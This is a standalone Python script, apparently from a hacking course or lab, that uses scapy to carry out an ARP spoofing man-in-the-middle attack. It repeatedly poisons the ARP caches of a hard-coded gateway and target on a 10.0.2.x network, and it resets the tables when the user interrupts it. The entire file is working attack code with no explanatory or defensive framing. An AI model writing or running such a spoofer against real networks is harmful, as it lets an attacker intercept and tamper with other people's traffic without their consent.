#!/usr/bin/python

import scapy.all as scapy
import sys
import time

def restore_defaults(dest, source):
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answer = scapy.srp(final_packet, timeout=1, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac

def spoofing(target, spoofed):
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, count=4, verbose=False)

gateway_ip = "10.0.2.1"
target_ip = "10.0.2.11"

def main():
    sent_packet_counts = 0
    try:
        while True:
            spoofing(gateway_ip, target_ip)
            spoofing(target_ip, gateway_ip)
            sent_packet_counts = sent_packet_counts + 2
            sys.stdout.write("\r[+] Sent " + str(sent_packet_counts) + " files")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[-] Detected CTRL + C \n[-] Resetting ARP tables \n[-] Quitting ...")
        restore_defaults(gateway_ip, target_ip)
        restore_defaults(target_ip, gateway_ip)

if __name__ == "__main__":
    main()